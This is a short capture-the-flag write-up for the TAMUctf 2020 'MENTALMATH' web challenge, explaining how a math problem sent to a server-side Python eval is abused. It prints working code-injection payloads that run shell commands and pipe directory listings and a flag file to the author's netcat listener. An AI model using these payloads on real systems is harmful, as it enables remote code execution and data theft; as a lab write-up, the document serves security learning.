# MENTALMATH Writeup

### TAMUctf 2020 - Web 262

> My first web app, check it out!
> 
> http://mentalmath.tamuctf.com
>
> Hint: I don't believe in giving prizes for solving questions, no matter how many!

#### Python code injection

- Math problem can be forged at userside.
- Changed problem to `1 + 2 + 3` and sent `6`. Correct.
- Invalid problem such as `&DN` gives 500 response code.
- Guess serverside uses some kind of `eval()` function.
- Let problem be `len('1234')` and sent `4`. Correct!
- It seems python!
- Listen by `nc -lvp [PORT]` on my local server.
- Make math problem `__import__('os').system('ls | nc [IP] [PORT]')`. Received output:

```
db.sqlite3
flag.txt
manage.py
mathgame
mentalmath
requirements.txt
```

- Python confirmed.
- Make math problem `__import__('os').system('cat flag.txt | nc [IP] [PORT]')` to get flag:

```
gigem{1_4m_g0od_47_m4tH3m4aatics_n07_s3cUr1ty_h3h3h3he}
```

- I also read `manage.py` because I was curious about server side operation. `manage.py` src:

```python
#!/usr/bin/env python
import os
import sys

if __name__ == '__main__':
    os.environ.setdefault('DJANGO_SETTINGS_MODULE', 'mentalmath.settings')
    try:
        from django.core.management import execute_from_command_line
    except ImportError as exc:
        raise ImportError(
            "Couldn't import Django. Are you sure it's installed and "
            "available on your PYTHONPATH environment variable? Did you "
            "forget to activate a virtual environment?"
        ) from exc
    execute_from_command_line(sys.argv)
```
